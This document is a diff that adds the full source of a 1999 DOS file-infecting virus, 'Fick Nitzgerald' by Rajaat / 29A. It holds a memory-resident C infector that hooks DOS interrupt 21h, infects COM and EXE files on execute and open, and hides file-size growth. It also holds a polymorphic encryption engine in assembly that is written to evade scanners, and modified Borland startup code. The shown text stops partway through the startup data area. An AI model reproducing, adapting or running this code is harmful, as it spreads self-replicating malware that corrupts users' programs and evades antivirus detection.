@@ -1,0 +1,1988 @@
+-----[ start ficknitz.c ]-----
+
+/*****( Fick Nitzgerald Virus by Rajaat / 29A )********************************
+*
+* Virus name    : Fick Nitzgerald
+* Author        : Rajaat / 29A
+* Origin        : United Kingdom, January 1999
+* Compiling     : Use the included batch file.
+*                 Borland C++ 3.1 and Turbo Assembler required
+* Targets       : COM & EXE files
+* Size          : 1st generation = 6694 bytes
+*                 Others are 7326 bytes
+* Resident      : Yes
+* Polymorphic   : Yes
+* Encrypted     : No
+* Stealth       : File size stealth on 11/12 and 4e/4f
+* Tunneling     : No
+* Retrovirus    : Yes, it is not easy to research a HLL virus :-)
+* Antiheuristics: Not deliberately, but I think it will pass some checks
+* Peculiarities : It's mainly written in Borland C++ 3.1 with some alterations
+*                 to the startup code of the "tiny model" code (C0.ASM) and
+*                 inline assembly.
+* Drawbacks     : Extensive debugging needed and thorough knowledge of
+*                 compilers and how they work. This virus has been written
+*                 in a timespan of almost 3 years (started in March 1996).
+* Behaviour     : When an infected file is executed the virus first will
+*                 relocate it's code to a segment boundary, so that it
+*                 is always aligned at CS:0100, no matter where it
+*                 resides. If the file is not a first generation sample,
+*                 it will also have a polymorphic decryptor before
+*                 realigning takes place. Afther that the virus will
+*                 check if it is already resident by issueing its
+*                 "are-you-there" call. If it is not resident, it will
+*                 find the last MCB, shrink it, and moves its code to
+*                 the top of memory. Then it will hook DOS interrupt.
+*                 After the virus has installed itself in memory, it
+*                 will return control to the host. After the host
+*                 recieves control, the virus will try to infect COM and
+*                 EXE files that are opened or executed. If the virus
+*                 can infect the file, it tries to allocate a block of
+*                 memory as buffer for its polymorphic engine. If it
+*                 can't allocate the memory it will attach the virus
+*                 unencrypted at the end of the host file. If the virus
+*                 can have enough memory it will call it's engine and
+*                 writes the virus at the end of the host file.
+*                 Furthermore, when the virus is resident it will hide
+*                 the increase in filelength by monitoring the
+*                 FindFirst/FindNext (11/12/4e/4f) of DOS. I do realise
+*                 that the virus has become quite big in length, thats
+*                 the sacrifice I had to make for writing a virus in C.
+*
+*                 It's unknown what this virus might do besides replicate :)
+*
+* Ps.             This is my last virus I've written as 29A member, I hereby
+*                 want to thank the others for their friendship and support.
+*
+*                 Btw, please read the attached text to support me in writing
+*                 new things.
+*
+*
+******************************************************************************/
+
+
+#pragma inline                          // sorry, some assembly is needed
+
+// Include some libraries I use
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <ctype.h>
+#include <conio.h>
+#include <dos.h>
+#include <dir.h>
+#include <mem.h>
+#include <io.h>
+#include <fcntl.h>
+#include <sys/stat.h>
+
+#define BreakPoint asm int 3;           // Included for testing purposes
+
+#define PING 0x30DE                     // are-you-there query
+#define PONG 0xB00B                     // are-you-there response
+#define DOSINT 0x21                     // take a guess
+
+#define virus_stealth_size 7326         // 11*0x29a (666)
+
+// Some typedefs to make my life easier
+typedef unsigned char BYTE;             // Bytes
+typedef unsigned int  WORD;             // Words
+typedef unsigned long DWORD;            // Doublewords
+typedef struct ffblk far *findrec;      // Needed for 4e/4f stealth
+
+// Needed for 11/12 stealth
+typedef struct dirblk {
+    BYTE db_drive;
+    char db_name[8];
+    char db_ext[3];
+    BYTE db_attrib;
+    BYTE db_reserved1[10];
+    WORD db_time;
+    WORD db_date;
+    WORD db_start;
+    unsigned long db_filesize;
+} far *dirrec;
+
+// The infamous EXE header :-!
+typedef struct exe_header {
+    WORD exe_id;                        // 0000
+    WORD exe_last_page;                 // 0002
+    WORD exe_pages;                     // 0004
+    WORD exe_rel_cnt;                   // 0006
+    WORD exe_hdr_size;                  // 0008
+    WORD exe_min_mem;                   // 000A
+    WORD exe_max_mem;                   // 000C
+    WORD exe_SS;                        // 000E
+    WORD exe_SP;                        // 0010
+    WORD exe_crc;                       // 0012
+    WORD exe_IP;                        // 0014
+    WORD exe_CS;                        // 0016
+    WORD exe_ofs_reloc;                 // 0018     also NEWexe check
+    WORD exe_overlay;                   // 001A     must be 0
+    DWORD exe_4bytes;                   // 001C
+    WORD exe_behaviour;                 // 0020
+    BYTE exe_reserved[25];              // 0022
+    DWORD exe_offset_NE;                // 003C     SHOULD be 0
+} exe_header;
+
+// I need to call some interrupts, and using C these two are needed
+union REGS regs;
+static struct SREGS segregs;
+
+extern WORD DSEG;                       // DS, in C0.ASM and needed
+extern near virus_start;                // Start of the virus (in C0.ASM)
+extern near virus_end;                  // End of the virus (in C0.ASM)
+extern WORD pspseg;                     // Segment of PSP (in C0.ASM)
+extern void fse(void);                  // The poly engine (FSE.ASM)
+
+// Some prototyping here (hey, it's C!)
+int get_virus_size(void);
+int get_virus_memory(void);
+int get_virus_paragraphs(void);
+void interrupt int_21_handler(int bp, int di, int si, int ds, int es,
+                              int dx, int cx, int bx, int ax,
+                              int ip, int cs, int flags);
+
+// The old int 0x21 pointer is stored here
+void interrupt ( *old_int_21)(void);
+
+// The stack and start of an infected EXE file
+static WORD host_sp = 0;
+static WORD host_ss = 0;
+static WORD host_ip = 0;
+static WORD host_cs = 0;
+
+// The jump and infection marker for a COM file
+static unsigned char newbytes[4] = { 0xE9, 0, 0, '!'};
+
+// The original 1st 4 bytes of a COM host (in this case return to DOS)
+static unsigned char org4bytes[0x4] = { 0xCD, 0x20, 0x00, 0x5B };
+
+// Buffer for reading the exe header
+static exe_header exe_buffer;
+
+// And here some boasting :-D
+// Oh hell, I spelled his name wrong!
+static unsigned char virname[] = "[ Fick Nitzgerald Virus ]";
+static unsigned char author[] = "[ Rajaat / 29A ]";
+
+// EXE & COM entrypoint
+void main(void) {
+    static int srcseg, srcofs;
+    static int seg;
+    static int ofs;
+
+    _fmode =  O_BINARY;                 // filemode always binary
+    old_int_21 = getvect(DOSINT);       // get dos int 21h ptr
+
+    regs.x.ax = PING;                   // Check if already resident
+    regs.x.bx = PONG;
+    int86(DOSINT,&regs,&regs);
+
+    if ((regs.x.ax != PONG) && (regs.x.bx != PING)) {
+
+        // Install resident
+        seg = getpsp()-1;               // get current mcb
+        if (peekb(seg,0) == 'Z') {
+            poke(seg,3,(peek(seg,3)-(get_virus_memory() >> 4)-1));
+            poke(seg,0x12,(peek(seg,0x12)-(get_virus_memory() >> 4)-1));
+            // nick now has enough memory at the top of dos memory
+            seg = (peek(seg,0x12)-0x10);
+            ofs = 0x100;
+            srcseg = _CS;
+            srcofs = &virus_start;
+            movedata(srcseg,srcofs,seg,ofs,get_virus_size());   // move virus
+
+            // hook dos int 21h
+            regs.x.ax = 0x2521;
+            regs.x.dx = FP_OFF(int_21_handler);
+            segregs.ds = seg;
+            int86x(DOSINT,&regs,&regs,&segregs);
+            poke(seg,&DSEG,seg);
+        }
+    }
+  if ((org4bytes[0] == 'M') && (org4bytes[1] == 'Z')) {
+    // Return to EXE host
+    asm {
+      mov ah,0x51
+      int 0x21
+      mov es,bx
+      mov ds,bx
+      add bx,0x10
+      mov cx,bx
+      add cx,word ptr cs:[host_ss]
+      add bx,word ptr cs:[host_cs]
+      cli
+      mov ss,cx
+      mov sp,word ptr cs:[host_sp]
+      sti
+      push bx
+      mov bx,word ptr cs:[host_ip]
+      push bx
+      xor bx,bx
+      xor ax,ax
+      retf
+    }
+  } else {
+    // Return to COM host
+    movedata(_CS,FP_OFF(org4bytes),pspseg,0x100,4);
+    asm {
+      mov ax,pspseg
+      mov ss,ax
+      mov ds,ax
+      mov es,ax
+      push ax
+      mov si,0feh
+      cmpsw
+      push si
+      xor ax,ax
+      retf
+    }
+  }
+  return;
+}
+
+// Get virus length
+int get_virus_size(void) {
+    asm lea ax,virus_end;
+    asm sub ax,offset virus_start;
+    _AX += 0x80;           // reserve some extra space
+    return _AX;
+}
+
+// Get virus memory length
+int get_virus_memory(void) {
+    return (get_virus_size());
+}
+
+// Get virus size in paragraphs
+int get_virus_paragraphs(void) {
+  return ((get_virus_size() / 10) + 1);
+}
+
+// Resident INT 21h handler
+void interrupt int_21_handler(int bp, int di, int si, int ds, int es,
+                              int dx, int cx, int bx, int ax,
+                              int ip, int cs, int flags) {
+    WORD temp;
+    char far *ch;
+    exe_header *exe_hdr;
+    static int handle;
+    static int stats;
+    static long filelength;
+    static long ne_offset;
+    static ldiv_t lx;
+    findrec searchdtarec;
+    dirrec searchdirrec;
+    static struct ftime filedate;
+    static char filename[128] = { "This space is reserved for holding the " \
+                                  "filename for internal use only! ;-) "};
+    static int segp;
+    static int nread;
+
+    // Installation check
+    if ((ax == PING) && (bx == PONG)) {
+        temp = ax;
+        ax = bx;
+        bx = temp;
+        return;
+        }
+
+    // File execute
+    temp = ax >> 8;
+    // FCB FindFirst/FindNext
+    if ((temp == 0x11) || (temp == 0x12)) {
+        _DS = ds;
+        _DX = dx;
+        _AX = ax;
+        asm {
+            pushf
+            call dword ptr cs:[old_int_21]
+            or al,al
+            jz fcb_ok
+            jmp error
+        }
+        fcb_ok:
+        asm push ax;
+        searchdirrec = getdta();
+        if (searchdirrec->db_drive == 0xff)
+           searchdirrec = getdta()+7;           // extended fcb
+        temp = searchdirrec->db_time & 0x1f;    // get seconds
+        if (temp == 30) {                       // 60? (vienna shit)
+          searchdirrec->db_filesize -= virus_stealth_size;  // substract virus
+          searchdirrec->db_time -= 10;                      // and time :-)
+        }
+        asm pop ax;
+        goto error;
+    }
+    // DOS FindFirst/FindNext
+    if ((temp == 0x4e) || (temp == 0x4f)) {
+        _DS = ds;
+        _DX = dx;
+        _CX = cx;
+        _AX = ax;
+        asm {
+            pushf
+            call dword ptr cs:[old_int_21]
+            jc error
+        }
+        asm push ax;
+        searchdtarec = getdta();
+        temp = searchdtarec->ff_ftime & 0x1f;
+        if (temp == 30) {                       // 60 seconds again?
+          searchdtarec->ff_fsize -= virus_stealth_size;     // yups, hide virus
+          searchdtarec->ff_ftime -= 10;                     // and seconds
+        }
+        asm pop ax;
+        error:
+        asm {
+            mov sp,bp
+            pop bp
+            pop di
+            pop si
+            pop ds
+            pop es
+            pop dx
+            pop cx
+            pop bx
+            add sp,2
+            clc
+            or al,al
+            jz no_stc
+            stc
+        }
+        no_stc:
+        asm retf 2;
+    }
+    if ((ax == 0x4b00) || (ax == 0x3d00) || (ax == 0x4300) || (ax == 0x6c00)) {
+        // replication part, invoced on execute, open, attrib and extopen
+        _DS = _CS;
+        nread = 0;
+        ch = MK_FP(ds,dx);
+        if (ax == 0x6c00) ch = MK_FP(ds,si);    // handle extopen ds:si > ds:dx
+        do {                                    // copy and upcase filename
+          filename[nread] = toupper(*ch);
+          nread++;
+          ch++;
+        } while (filename[nread-1] != '\0');
+
+        _DS = _CS;
+        _ES = _CS;
+        if ((strstr(filename,".COM") != NULL) ||        // com extension?
+            (strstr(filename,".EXE") != NULL)) {        // exe extension?
+          handle = _open(filename,O_RDWR);              // open file
+          if (handle != -1) {                           // no error?
+            getftime(handle, &filedate);                // store filedate/time
+            _read(handle, org4bytes, 0x4);              // read 4 bytes
+            if ((org4bytes[0] == 'M') && (org4bytes[1] == 'Z')) {
+                // EXE file
+                lseek(handle,0L,SEEK_SET);
+                _read(handle,&exe_buffer,sizeof(exe_buffer));   // read header
+                if ((exe_buffer.exe_overlay == 0) &&            // no overlay?
+                    (exe_buffer.exe_crc != 0x29A)) {            // not infected?
+                    ne_offset = lseek(handle, exe_buffer.exe_offset_NE, SEEK_SET);
+                    filelength = lseek(handle,0L,SEEK_END);
+                    lx = ldiv(filelength, 0x200);
+                    lx.quot += 1;
+                    if (ne_offset == 0) ne_offset=filelength+1;
+                    if ((filelength < ne_offset) &&
+                       (exe_buffer.exe_ofs_reloc < 0x60) &&
+                       ((WORD) lx.quot == exe_buffer.exe_pages) &&
+                       ((WORD) lx.rem == exe_buffer.exe_last_page)) {
+                        // ok, no overlays, and no windows exe (strange check)
+                        // now store original stack and entrypoint
+                        host_ss = exe_buffer.exe_SS;
+                        host_sp = exe_buffer.exe_SP;
+                        host_cs = exe_buffer.exe_CS;
+                        host_ip = exe_buffer.exe_IP;
+                        lx = ldiv(filelength, 0x10);
+                        lx.quot -= exe_buffer.exe_hdr_size;
+                        // fill new entrypoint (virus) in header
+                        exe_buffer.exe_CS = (WORD) lx.quot-0x10;
+                        exe_buffer.exe_IP = (WORD) lx.rem+0x100;
+                        exe_buffer.exe_SS = (WORD) lx.quot;
+                        exe_buffer.exe_SP = (get_virus_size() | 1)+0x301;
+                        exe_buffer.exe_min_mem += get_virus_paragraphs();
+                        stats = allocmem(get_virus_paragraphs()+10, &segp);
+                        if (stats == -1) {          // enough memory?
+                            // Poly code here
+                          _CX = get_virus_size();
+                          ch = MK_FP(segp, 0);
+                          _SI = &virus_start;
+                          _ES = segp;
+                          _DI = 0;
+                          _AX = exe_buffer.exe_IP;
+                          fse();                    // my fucking small engine
+                          _ES = _CS;
+                          _DS = _CS;
+                          _dos_write(handle, ch, virus_stealth_size, &stats);
+                          freemem(segp);            // free memory used by fse
+                        } else
+                          // Not enough memory, so we just don't poly
+                          _write(handle,&virus_start,virus_stealth_size);
+                        filelength = lseek(handle,0L, SEEK_END);
+                        lx = ldiv(filelength, 0x200);
+                        // update exe pagecount
+                        exe_buffer.exe_pages = (WORD) lx.quot;
+                        exe_buffer.exe_last_page = (WORD) lx.rem;
+                        exe_buffer.exe_pages++;
+                        // and set infection marker (checksum field)
+                        exe_buffer.exe_crc = 0x29A;
+                        lseek(handle,0L, SEEK_SET);
+                        _write(handle,&exe_buffer,sizeof(exe_buffer));
+                        filedate.ft_tsec = 30;      // is 60!
+                        setftime(handle, &filedate);
+                      }
+                }
+            } else {
+              // COM file
+              if (org4bytes[3] != '!') {            // already infected?
+                filelength = lseek(handle,0L, SEEK_END);
+                if ((filelength < 0xf000) && (filelength > 0x100)) {
+                  // file is not too long
+                  stats = allocmem(get_virus_paragraphs()+10, &segp);
+                  if (stats == -1) {
+                    // Poly code here
+                    _CX = get_virus_size();
+                    ch = MK_FP(segp, 0);
+                    _SI = &virus_start;
+                    _ES = segp;
+                    _DI = 0;
+                    _AX = filelength + 0x100;
+                    fse();                          // what was it again? ;-)
+                    _ES = _CS;
+                    _DS = _CS;
+                    _dos_write(handle, ch, virus_stealth_size, &stats);
+                    freemem(segp);
+                  } else
+                     // Not enough memory, so we just don't poly
+                    _write(handle,&virus_start,virus_stealth_size);
+                  lseek(handle,0L, SEEK_SET);
+                  filelength -= 3;                  // calc com jump to virus
+                  newbytes[1] = filelength & 0xff;
+                  newbytes[2] = (filelength >> 8) & 0xff;
+                  _write(handle,newbytes,4);
+                  filedate.ft_tsec = 30;            // is 60!
+                  setftime(handle, &filedate);
+                }
+              }
+            }
+            _close(handle);                         // we're done...
+        }
+
+      }
+      goto eoi_21;
+    };
+
+// Chain to old interrupt
+eoi_21:
+;
+asm {
+    mov sp,bp
+    pop bp
+    pop di
+    pop si
+    pop ds
+    pop es
+    pop dx
+    pop cx
+    pop bx
+    pop ax
+    jmp dword ptr cs:[old_int_21]
+}
+
+}
+
+// Oh, eh... Raid, this isn't a host encrypting prepending non resident
+// infector, this is the real McCoy (I hope you can stand a joke, but you
+// get the drift).
+
+-----[ end ficknitz.c ]-----
+
+-----[ start fse.asm ]-----
+
+;=====( Fucking Small Engine - by Rajaat / 29A )===============================
+;
+; Type     : Polymorphic Engine
+; Comments : This polymorphic engine is very easy to detect, since uses no
+;            random trash code or anything else to complicate detecting the
+;            decryptor itself, but this is made to see how you could defeat
+;            scanners that still use the (in my opinion obsolete) XRAY
+;            technique to detect encrypted viruses. FSE uses 8-15
+;            different operations on each byte, making it virtually
+;            impossible to do a cryptanalytic attack.
+;
+;            Operands used by FSE to encrypt code:
+;            XOR   SUB   ADD   ROL   ROR   NOT   NEG   INC   DEC
+;
+;            Registers used by FSE as pointer:
+;            BX    SI    DI
+;
+;            Registers used by FSE as counter:
+;            AX    BX    CX    DX    SI    DI    BP
+;
+;=====( Fucking Small Engine - by Rajaat )=====================================
+;
+; DS:SI = code to encrypt
+; ES:DI = place for encrypted code + decryptor
+; CX    = code length to encrypt
+; AX    = offset in target
+;
+;==============================================================================
+.model tiny
+.code
+.radix 16
+
+public C fse                                    ; yes, I used it in my Borland
+                                                ; C virus :-D
+
+fse             proc C                          ; fse()
+
+                push bp                         ; preserve BP
+
+                call get_offset                 ; get delta offset (in case you
+get_offset:     pop bp                          ; are making a direct action
+                sub bp,offset get_offset        ; infector)
+
+                push di es                      ; save some registers I need
+                push si                         ; later on
+                push cx                         ;
+                push ax                         ;
+                push di                         ;
+                push di                         ;
+                cld                             ;
+
+                push es                         ; clear encrypt code buffer
+                push cs                         ; (there was a bug in here when
+                pop es                          ; this source was on my home
+                lea si,end_sequencer[bp]        ; page, it ES != CS it would
+                lea di,enc_sequencer[bp]        ; make incorrect encryptions)
+                mov al,90                       ;
+                push cx                         ;
+                mov cx,len_sequencer            ;
+                rep stosb                       ;
+                pop cx                          ;
+
+                pop es                          ;
+                pop di                          ;
+
+                mov ax,1f0e                     ; write PUSH CS / POP DS
+                stosw                           ; sequence (wow, fixed code)
+
+bad_registers:  call rnd_get
+                and ax,0707
+                cmp ah,al                       ; pointer & counter can't be
+                je bad_registers                ; the same register
+                cmp al,4                        ; don't use SP!
+                je bad_registers
+                cmp ah,03                       ; BX is pointer register
+                je good_pointer
+                cmp ah,6                        ; or else FSE uses SI or DI as
+                jb bad_registers                ; index register
+good_pointer:   push ax
+                sub ah,6
+                cmp ah,08
+                jb convert_ok
+                mov ah,3
+convert_ok:     mov byte ptr cs:pointer_reg[bp],ah
+                pop ax
+                add ax,0b8b8
+                push ax
+                call rnd_get
+                mov bx,1
+                inc ax
+                pop ax
+                jns dont_flip
+                xchg ah,al
+                xchg bh,bl
+dont_flip:      stosb
+                mov dx,di
+                test bl,1
+                push ax
+                jz no_counter
+                call rnd_get
+                and ax,1ff
+                add ax,cx
+no_counter:     stosw
+                pop ax
+                xchg ah,al
+                stosb
+                push ax bx
+                test bl,1
+                jnz is_counter
+                and ax,1ff
+                add ax,cx
+                jmp store
+is_counter:     mov dx,di
+store:          stosw
+                mov cx,di
+                push cx
+
+                call rnd_get
+                mov cx,ax
+                and cx,7
+                add cx,7
+
+encrypt_actions:
+
+                call rnd_get
+no_more_than_8: and ax,1f
+                sub ax,8
+                cmp ax,8
+                ja no_more_than_8
+                shl ax,1
+                mov bx,ax
+                add bx,bp
+                mov ax,word ptr cs:enc_opers[bx]
+                test ah,80
+                jnz no_xor_add_sub
+                mov ah,80
+                add al,byte ptr cs:pointer_reg[bp]
+                xchg ah,al
+                stosw
+                call rnd_get
+                stosb
+                jmp xor_add_sub
+no_xor_add_sub: sub ah,0bc
+                add ah,byte ptr cs:pointer_reg[bp]
+no_bx:          stosw
+xor_add_sub:    mov bx,word ptr cs:dec_opers[bx]
+                cmp bh,0
+                jne no_xas
+                mov bh,al
+no_xas:         mov word ptr cs:[si],bx
+                dec si
+                dec si
+
+                loop encrypt_actions
+
+                pop cx
+
+                ;=== inc/dec pointer and counter
+                pop bx ax
+                test bl,1
+                jnz pointer_first
+                xchg ah,al
+pointer_first:  sub ax,7078
+                stosb
+                push ax
+                pop ax
+                xchg ah,al
+                stosb
+                ;=== building repeat loop
+                cmp al,49
+                mov al,75
+                jnz no_loop
+                dec di
+                mov al,0e2
+no_loop:        stosb
+                sub cx,di
+                dec cx
+                xchg ax,cx
+                stosb
+
+                xchg bx,dx
+                mov dx,di
+                pop ax
+                sub dx,ax
+                pop ax
+                add dx,ax
+                mov word ptr es:[bx],dx
+                pop cx
+                ;=== encrypt code
+                pop si
+encrypt_loop:   lodsb
+                call enc_sequencer
+                stosb
+                loop encrypt_loop
+                mov cx,di
+                pop ds dx
+                sub cx,dx
+                pop bp
+                ret
+
+rnd_get:        in al,40
+                xchg ah,al
+                in al,41
+                xor al,ah
+                ret
+
+                ;  XOR   SUB   ADD   ROL   ROR   NOT   NEG   INC   DEC
+enc_opers       dw 00034,0002c,00004,0c0d0,0c8d0,0d0f6,0d8f6,0c0fe,0c8fe
+                ;  XOR   ADD   SUB   ROR   ROL   NOT   NEG   DEC   INC
+dec_opers       dw 00034,00004,0002c,0c8d0,0c0d0,0d0f6,0d8f6,0c8fe,0c0fe
+
+fse_signature   db '[ FSE 1.0 by Rajaat / 29A ]',0
+
+enc_sequencer:  dw 18 dup (9090)        ; buffer for encryptor code
+end_sequencer   equ $-2
+len_sequencer   equ $-enc_sequencer
+                ret
+pointer_reg     db 0
+
+fse             endp
+
+end
+
+-----[ end fse.asm ]-----
+
+-----[ start c0.asm ]-----
+
+;[]------------------------------------------------------------[]
+;|      C0.ASM -- Start Up Code for DOS                         |
+;[]------------------------------------------------------------[]
+;
+;       C/C++ Run Time Library - Version 5.0
+; 
+;       Copyright (c) 1987, 1992 by Borland International
+;       All Rights Reserved.
+;
+;=====( Modifications by Rajaat / 29A )========================================
+;
+; I had to make some alterations to the startupcode of Borland C++ 3.1 in order
+; to make my code work. I could not avoid this due to the design of the main
+; code. If I would wanted to leave this part untouched I would have written a
+; prepender.
+;
+; I also removed some useless code, like the Borland copyright notice (since I
+; think the av will undoubtly recognize this one as a HLL virus, they
+; unfortunately missed it that Animo.518 also was a HLL virus), the
+; checksumming code, the code that you can insert more startup code using the
+; #pragma startup in the source, BIOS time in ticks, midnight time flag and
+; some other things. Also I had to insert a call to the __setupio() code.
+;
+; Anyway, this file is a quick hack of the original code and may or may not be
+; bug free or completely optimized, but since it is needed by the rest of the
+; code I'll release it nonetheless.
+;
+; For instructions how to compile this, check the main C source,
+; NICKFITZ.C
+;
+;==============================================================================
+
+                locals
+
+                __C0__ = 1
+INCLUDE         RULES.ASI
+
+;       Segment and Group declarations
+
+_TEXT           SEGMENT BYTE PUBLIC 'CODE'
+                ENDS
+_FARDATA        SEGMENT PARA PUBLIC 'FAR_DATA'
+                ENDS
+_FARBSS         SEGMENT PARA PUBLIC 'FAR_BSS'
+                ENDS
+_DATA           SEGMENT PARA PUBLIC 'DATA'
+                ENDS
+_INIT_          SEGMENT WORD PUBLIC 'INITDATA'
+InitStart       label byte
+                ENDS
+_INITEND_       SEGMENT BYTE PUBLIC 'INITDATA'
+InitEnd         label byte
+                ENDS
+_EXIT_          SEGMENT WORD PUBLIC 'EXITDATA'
+ExitStart       label byte
+                ENDS
+_EXITEND_       SEGMENT BYTE PUBLIC 'EXITDATA'
+ExitEnd         label byte
+                ENDS
+_CVTSEG         SEGMENT WORD PUBLIC 'DATA'
+                ENDS
+_SCNSEG         SEGMENT WORD PUBLIC 'DATA'
+                ENDS
+IFNDEF __HUGE__
+  _BSS          SEGMENT WORD PUBLIC 'BSS'
+                ENDS
+  _BSSEND       SEGMENT BYTE PUBLIC 'BSSEND'
+                ENDS
+ENDIF
+
+        ASSUME  CS:_TEXT, DS:DGROUP
+
+;       External References
+
+extrn       _main:DIST
+extrn       __exit:DIST
+extrn       __nfile:word
+extrn       __setupio:near          ;required!
+extrn       __stklen:word
+IF LDATA  EQ  false
+extrn       __heaplen:word
+ENDIF
+
+        SUBTTL  Start Up Code
+        PAGE
+;/*                                                     */
+;/*-----------------------------------------------------*/
+;/*                                                     */
+;/*     Start Up Code                                   */
+;/*     -------------                                   */
+;/*                                                     */
+;/*-----------------------------------------------------*/
+;/*                                                     */
+PSPHigh         equ     00002h
+PSPEnv          equ     0002ch
+PSPCmd          equ     00080h
+
+                public  __AHINCR
+                public  __AHSHIFT
+                public  _DSEG
+
+                public  _exit
+                public  _abort
+
+                public  __terminate
+                public  __checknull
+                public  __restorezero
+                public  __cleanup
+
+__AHINCR        equ     1000h
+__AHSHIFT       equ     12
+
+;
+;       At the start, DS and ES both point to the segment prefix.
+;       SS points to the stack segment except in TINY model where
+;       SS is equal to CS
+;
+_TEXT           SEGMENT
+                ORG     100h
+STARTX          PROC    NEAR
+;       Save general information, such as :
+;               DGROUP segment address
+;               DOS version number
+;               Program Segment Prefix address
+;               Environment address
+;               Top of far heap
+
+PubSym@         virus_start,    <label byte>,   __CDECL__
+
+                call get_offset                 ; get delta offset for the
+get_offset:     pop bx                          ; relocator.
+                mov si,bx                       ;
+                sub si,offset get_offset        ;
+
+                mov word ptr cs:_pspseg[si],ds  ; store PSP for C code
+                or si,si                        ; no delta offset?
+                jz no_fixup                     ; indeed, no alignment needed
+                                                ; jump to no_fixup
+
+                lea si,_virus_start[si]         ; this part relocates the whole
+                lea di,_virus_end               ; code so that it gets aligned
+                push ds                         ; at a paragraph. this gets
+                push cs                         ; calculated in such way that
+                pop ds                          ; whereever the code may reside
+                dec bh                          ; it always is located at
+                mov cl,4                        ; CS:100h, just like the
+                shr bx,cl                       ; compiled original. this also
+                mov ax,cs                       ; makes it ideal for memory
+                add bx,ax                       ; residency.
+                add bx,10                       ;
+                mov es,bx                       ;
+                lea cx,_virus_end-100h          ;
+                add si,cx                       ;
+                std                             ; we move in backwards fashion
+                rep movsb                       ; to prevent overwriting our
+                movsb                           ; own code
+                pop ds                          ;
+
+                push bx                         ; we now jump back to the
+                mov ax,100h xor 0deadh          ; relocated relocator (wow!
+                xor ax,0deadh                   ; did we jump to the original
+                push ax                         ; program, tbclean?) which
+                retf                            ; sees that we are aligned and
+                                                ; will eventually end at
+                                                ; no_fixup
+
+no_fixup:       push cs                         ; i clean some segments here,
+                push cs                         ; C would probably require it
+                push cs                         ;
+                pop ds                          ;
+                pop es                          ;
+                pop ss                          ;
+                mov ax,word ptr cs:_pspseg      ;
+
+;=====( Comments from Rajaat )=================================================
+; From here on I've cutted out some Borland code, but I left their comments in.
+; Excuse me if it looks a bit confusing, but it's just a stripped version of
+; the normal Borland C++ 3.1 startup code.
+;==============================================================================
+
+                mov     _psp@, ax       ; Keep Program Segment Prefix address
+                push    ax
+                pop     ds
+
+                mov     dx, cs          ; DX = GROUP Segment address
+                mov     cs:DGROUP@@, dx ;  __BOSS__
+                mov     ah, 30h
+                int     21h             ; get DOS version number
+                mov     bp, ds:[PSPHigh]; BP = Highest Memory Segment Addr
+                mov     bx, ds:[PSPEnv] ; BX = Environment Segment address
+                mov     ds, dx
+                mov     _version@, ax   ; Keep major and minor version number
+                mov     _envseg@, bx    ; Keep Environment Segment address
+                mov     word ptr _heaptop@ + 2, bp
+
+;       Count the number of environment variables and compute the size.
+;       Each variable is ended by a 0 and a zero-length variable stops
+;       the environment. The environment can NOT be greater than 32k.
+
+                mov     ax, _envseg@
+                mov     es, ax
+                xor     ax, ax
+                mov     bx, ax
+                mov     di, ax
+
+                mov     cx, 07FFFh      ; Environment cannot be > 32 Kbytes
+                cld
+@@EnvLoop:
+                repnz   scasb
+                jcxz    InitFailed      ; Bad environment !!!
+
+                inc     bx              ; BX = Nb environment variables
+                cmp     es:[di], al
+                jne     @@EnvLoop       ; Next variable ...
+                or      ch, 10000000b
+                neg     cx
+                mov     _envLng@, cx    ; Save Environment size
+                mov     cx, dPtrSize / 2
+                shl     bx, cl
+                add     bx, dPtrSize * 4
+                and     bx, not ((dPtrSize * 4) - 1)
+                mov     _envSize@, bx   ; Save Environment Variables Nb.
+
+;       Reset uninitialized data area
+
+                xor     ax, ax
+                mov     es, cs:DGROUP@@
+                mov     di, offset DGROUP: bdata@
+                mov     cx, offset DGROUP: edata@
+                sub     cx, di
+                cld
+                rep     stosb
+
+;   If default number of file handles have changed then tell DOS
+
+;       Prepare main arguments
+
+;=====( I commented this out, if you really want it just remove the comments )=
+;               mov     ah, 0
+;               int     1ah                     ; get current BIOS time in ticks
+;               mov     word ptr _StartTime@,dx ; save it for clock() fn
+;               mov     word ptr _StartTime@+2,cx
+;               or      al,al                   ; was midnight flag set?
+;               jz      @@NotMidnight
+;               mov     ax,40h                  ; set BIOS midnight flag
+;               mov     es,ax                   ;  at 40:70
+;               mov     bx,70h
+;               mov     byte ptr es:[bx],1
+
+@@NotMidnight:
+                xor     bp,bp                   ; set BP to 0 for overlay mgr
+
+                mov     es, cs:DGROUP@@
+
+;       ExitCode = main(argc,argv,envp);
+
+                call __setupio                  ;===( Done manually! )=========
+
+IF      LDATA
+                push    word ptr __C0environ+2
+                push    word ptr __C0environ
+                push    word ptr __C0argv+2
+                push    word ptr __C0argv
+ELSE
+                push    word ptr __C0environ
+                push    word ptr __C0argv
+ENDIF
+                push    __C0argc
+                call    _main
+
+;       Flush and close streams and files
+_exit:
+_abort:
+InitFailed:
+                mov bx,word ptr cs:_pspseg
+                mov es,bx
+                mov ds,bx
+                mov ss,bx
+                mov ax,4c00h
+                int 21h
+
+__terminate:
+__checknull:
+__restorezero:
+__cleanup:      ret
+
+
+;---------------------------------------------------------------------------
+;       _cleanup()      call all #pragma exit cleanup routines.
+;       _checknull()    check for null pointer zapping copyright message
+;       _terminate(int) exit program with error code
+;
+;       These functions are called by exit(), _exit(), _cexit(),
+;       and _c_exit().
+;---------------------------------------------------------------------------
+
+STARTX          ENDP
+
+        SUBTTL  Vector save/restore & default Zero divide routines
+        PAGE
+;------------------------------------------------------------------
+
+; The DGROUP@ variable is used to reload DS with DGROUP
+
+_DSEG           equ $
+PubSym@         DGROUP@, <dw    ?>, __PASCAL__
+
+; __MMODEL is used to determine the memory model or the default
+; pointer types at run time.
+
+                public __MMODEL
+__MMODEL        dw      MMODEL
+
+_TEXT           ENDS
+
+                SUBTTL  Start Up Data Area
+                PAGE
+;[]------------------------------------------------------------[]
+;|      Start Up Data Area                                      |
+;|                                                              |
+;|      WARNING         Do not move any variables in the data   |
+;|                      segment unless you're absolutely sure   |
+;|                      that it does not matter.                |
+;[]------------------------------------------------------------[]
+
+_DATA           SEGMENT
+
+;       Magic symbol used by the debug info to locate the data segment
+                public DATASEG@
+DATASEG@        label   byte
+
+;
+;                       Miscellaneous variables
+;
+PubSym@         _C0argc,        <dw     0>,             __CDECL__
+dPtrPub@        _C0argv,        0,                      __CDECL__
+dPtrPub@        _C0environ,     0,                      __CDECL__
